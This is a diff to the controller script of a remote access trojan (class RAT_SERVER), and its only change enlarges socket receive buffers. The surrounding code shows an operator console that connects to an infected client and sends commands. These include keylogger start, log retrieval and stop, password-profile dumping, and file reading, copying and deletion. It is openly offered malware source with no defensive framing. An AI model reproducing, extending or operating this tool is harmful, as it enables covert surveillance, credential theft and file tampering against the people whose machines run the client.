@@ -14,7 +14,7 @@ class RAT_SERVER:
         s.listen(5)
         print("[*] Waiting for the client... ⏰")
         client, addr = s.accept()
-        ipcli = client.recv(1024).decode()
+        ipcli = client.recv(2048).decode()
         print(f"[*] Connection established with {ipcli} 💣")
 
     def server(self):
@@ -31,7 +31,7 @@ class RAT_SERVER:
 
     def result(self):
         client.send(command.encode())
-        result_output = client.recv(1024).decode()
+        result_output = client.recv(2048).decode()
         print(result_output)
 
     def banner(self):
@@ -145,7 +145,7 @@ readfile <file>           read from file
                     client.send(command.encode())
                     if command.lower() == 'exit':
                         break
-                    result_output = client.recv(1024).decode()
+                    result_output = client.recv(2048).decode()
                     print(result_output)
                 client.close()
                 s.close()
@@ -175,7 +175,7 @@ readfile <file>           read from file
                 root = str(input('Enter the path to key: '))
                 client.send(const.encode())
                 client.send(root.encode())
-                result_output = client.recv(1024).decode()
+                result_output = client.recv(2048).decode()
                 print(result_output)
 
             elif command == 'createkey':
@@ -227,22 +227,22 @@ readfile <file>           read from file
                 client.send(command.encode())
                 text = str(input("Enter the filename: "))
                 client.send(text.encode())
-                result_output = client.recv(1024).decode()
+                result_output = client.recv(2048).decode()
                 print(result_output)
 
             elif command == 'keyscan_start':
                 client.send(command.encode())
-                result_output = client.recv(1024).decode()
+                result_output = client.recv(2048).decode()
                 print(result_output)
 
             elif command == 'send_logs':
                 client.send(command.encode())
-                result_output = client.recv(1024).decode()
+                result_output = client.recv(2048).decode()
                 print(result_output)
 
             elif command == 'stop_keylogger':
                 client.send(command.encode())
-                result_output = client.recv(1024).decode()
+                result_output = client.recv(2048).decode()
                 print(result_output)
 
             elif command[:7] == 'delfile':
@@ -275,7 +275,7 @@ readfile <file>           read from file
                 client.send(text.encode())
                 title = str(input("Enter the title: "))
                 client.send(title.encode())
-                result_output = client.recv(1024).decode()
+                result_output = client.recv(2048).decode()
                 print(result_output)
 
             elif command == 'profilepswd':
@@ -353,7 +353,7 @@ readfile <file>           read from file
                 client.send(command.encode())
                 quiery = str(input("Enter the quiery: "))
                 client.send(quiery.encode())
-                result_output = client.recv(1024).decode()
+                result_output = client.recv(2048).decode()
                 print(result_output)
 
             elif command[:2] == 'cp':
@@ -460,7 +460,7 @@ readfile <file>           read from file
 
             elif command == 'exit':
                 client.send(command.encode())
-                output = client.recv(1024)
+                output = client.recv(2048)
                 output = output.decode()
                 print(output)
                 s.close()
